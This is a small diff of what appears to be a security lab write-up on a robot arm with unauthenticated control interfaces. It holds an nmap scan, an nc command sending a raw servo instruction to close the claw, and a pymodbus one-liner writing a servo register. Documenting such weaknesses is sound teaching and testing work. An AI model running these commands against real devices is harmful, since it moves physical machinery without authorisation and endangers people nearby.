@@ -50,7 +50,7 @@ The MQTT bridge subscribes to a broker that runs with `mosquitto-nossl` and no c
 nmap -sV -p 2000,502,1883 192.168.2.1
 
 # A. Raw serial bus - close the claw with no auth
-printf 'S3:0\n' | nc 192.168.2.1 2000
+printf 'S3:5\n' | nc 192.168.2.1 2000
 
 # B. Modbus/TCP - write base servo angle (register 40001 -> offset 0)
 python3 -c 'from pymodbus.client import ModbusTcpClient as C; c=C("192.168.2.1",port=502); c.connect(); c.write_register(0,10); c.close()'
